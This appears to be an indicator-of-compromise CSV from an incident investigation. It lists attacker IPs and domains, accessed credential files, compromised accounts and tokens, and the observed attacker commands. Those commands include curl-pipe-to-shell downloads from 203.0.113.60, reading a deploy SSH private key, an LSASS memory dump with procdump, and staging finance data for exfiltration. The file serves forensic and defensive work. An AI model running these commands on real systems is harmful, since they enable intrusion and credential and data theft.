type,value,first_seen,last_seen,related_asset,evidence_ids
ip,198.51.100.77,2026-07-06T09:05:00+08:00,2026-07-06T09:20:14+08:00,web-prod-01;waf-01,E002;E012;E011;E018;E019;E021
ip,203.0.113.60,2026-07-06T09:16:10+08:00,2026-07-06T10:24:05+08:00,web-prod-01;ci-runner-01,E015;E016;E017;E072;E073
ip,203.0.113.210,2026-07-06T11:08:00+08:00,2026-07-06T11:08:01+08:00,ops-jump-01,E089;E090
ip,203.0.113.77,2026-07-06T11:50:00+08:00,2026-07-06T11:50:18+08:00,ops-jump-01,E099;E100;E101;E103;E104
domain,update-cache.example,2026-07-06T09:16:14+08:00,2026-07-06T09:16:14+08:00,web-prod-01,E016
domain,archive-sync-bkt.storage.example,2026-07-06T11:08:00+08:00,2026-07-06T11:15:30+08:00,ops-jump-01;ci-runner-01,E089;E092
domain,cdn-sync.example,2026-07-06T11:50:00+08:00,2026-07-06T11:50:12+08:00,ops-jump-01,E099;E100;E101;E102
file,/var/www/oa/public/.cache.php,2026-07-06T09:20:05+08:00,2026-07-06T09:20:14+08:00,web-prod-01,E020;E021
file,/opt/oa/.env,2026-07-06T09:31:00+08:00,2026-07-06T09:31:00+08:00,web-prod-01,E028
file,/home/deploy/.ssh/id_rsa,2026-07-06T09:31:24+08:00,2026-07-06T09:31:24+08:00,web-prod-01,E029
file,/opt/oa/config/prod.yml,2026-07-06T09:31:48+08:00,2026-07-06T09:31:48+08:00,web-prod-01,E030
file,C:\Windows\Temp\ls.dmp,2026-07-06T10:27:00+08:00,2026-07-06T10:27:00+08:00,win-admin-01,E074;E075
file,C:\Temp\finance_q2.7z,2026-07-06T10:49:00+08:00,2026-07-06T11:35:25+08:00,win-admin-01;ops-jump-01,E087;E094
file,bi_part01.zst,2026-07-06T11:08:00+08:00,2026-07-06T11:35:25+08:00,ops-jump-01;pgsql-bi-01,E089;E094
file,erp_full_20260705.tar.zst,2026-07-06T11:15:00+08:00,2026-07-06T11:15:30+08:00,ci-runner-01,E091;E092
file,/tmp/.cache/.stage/full.tar,2026-07-06T11:35:25+08:00,2026-07-06T11:50:12+08:00,ops-jump-01,E094;E095;E101;E102
account,deploy,2026-07-06T09:31:24+08:00,2026-07-06T11:50:12+08:00,ops-jump-01;web-prod-01,E029;E033;E089;E094;E102
account,crm_ro,2026-07-06T09:51:00+08:00,2026-07-06T10:03:00+08:00,mysql-core-01,E038;E040;E041;E042;E043;E047
account,svc_deploy,2026-07-06T10:05:18+08:00,2026-07-06T10:18:21+08:00,gitlab-01;jenkins-01,E050;E056;E057;E058;E064;E066
account,CORP\svc_backup,2026-07-06T10:02:00+08:00,2026-07-06T10:49:00+08:00,ad-dc-01;win-admin-01;file-srv-01,E044;E052;E053;E054;E055;E061;E069;E070;E074;E075;E082;E087
account,bi_sync,2026-07-06T10:12:00+08:00,2026-07-06T10:19:20+08:00,pgsql-bi-01,E059;E065;E067;E068
account,gitlab-runner,2026-07-06T10:24:00+08:00,2026-07-06T11:15:30+08:00,ci-runner-01,E072;E077;E092
token,pat/deploy-token,2026-07-06T10:05:00+08:00,2026-07-06T10:05:18+08:00,gitlab-01,E049;E050
token,system:serviceaccount:prod:ci-runner,2026-07-06T10:28:00+08:00,2026-07-06T10:42:00+08:00,ci-runner-01;k8s-master-01,E077;E078;E079;E080;E081;E085
command,bash -c curl -fsSL https://203.0.113.60/a.sh | sh,2026-07-06T09:16:10+08:00,2026-07-06T09:16:10+08:00,web-prod-01,E015
command,python3 -c write('/var/www/oa/public/.cache.php'),2026-07-06T09:20:05+08:00,2026-07-06T09:20:05+08:00,web-prod-01,E020
command,cat /home/deploy/.ssh/id_rsa,2026-07-06T09:31:24+08:00,2026-07-06T09:31:24+08:00,web-prod-01,E029
command,bash -c curl -fsSL https://203.0.113.60/ci.sh | bash,2026-07-06T10:24:00+08:00,2026-07-06T10:24:00+08:00,ci-runner-01,E072
command,procdump.exe -ma lsass.exe C:\Windows\Temp\ls.dmp,2026-07-06T10:27:00+08:00,2026-07-06T10:27:00+08:00,win-admin-01,E074;E075
command,robocopy \\file-srv-01\finance C:\Temp\f /E,2026-07-06T10:41:04+08:00,2026-07-06T10:41:04+08:00,file-srv-01;win-admin-01,E084
command,7z.exe a C:\Temp\finance_q2.7z C:\Temp\f,2026-07-06T10:49:00+08:00,2026-07-06T10:49:00+08:00,win-admin-01,E087
command,tar -cf /tmp/.cache/.stage/full.tar finance_q2.7z bi_part01.zst,2026-07-06T11:35:25+08:00,2026-07-06T11:35:25+08:00,ops-jump-01,E094
